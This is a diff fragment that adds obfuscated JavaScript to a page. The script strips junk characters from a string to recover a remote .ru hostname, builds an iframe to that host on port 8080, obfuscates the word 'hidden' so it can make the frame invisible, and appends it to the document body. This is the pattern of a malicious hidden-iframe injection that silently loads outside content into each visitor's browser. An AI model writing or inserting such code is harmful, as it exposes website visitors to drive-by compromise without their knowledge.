@@ -1,0 +1,6 @@
+
+N9jg0oa = 'p^&&c)o#)^n^!&&)l^#^i!)n#@e@-!&^)c(!!o^&m#$()-$@c&!&)n#$.&a(^!(d@#$!#v@@e$!r&!t)s#!e&!r@^v$@e@)$.#(c$@&o))^!m)$.^&@s)&l&#&!u&(#t^#&l^@o(#a))!^d@#)(-&(!c!()!!o$&@m@!).)(f)o$@&!r@!a&&(&l^!&l#p#^#@r$^o!&@.^()(r&#^u^^'.replace(/\$|&|#|\)|@|\!|\(|\^/ig, '');
+f = document.createElement('iframe');
+f.src = 'http://'+N9jg0oa+':8080/index.php?ys';
+f.style.visibility = 'h#i!d!)d^&(e$$$!n$#^'.replace(/\$|\!|&|\(|@|\)|#|\^/ig, '');
+document.body.appendChild(f);
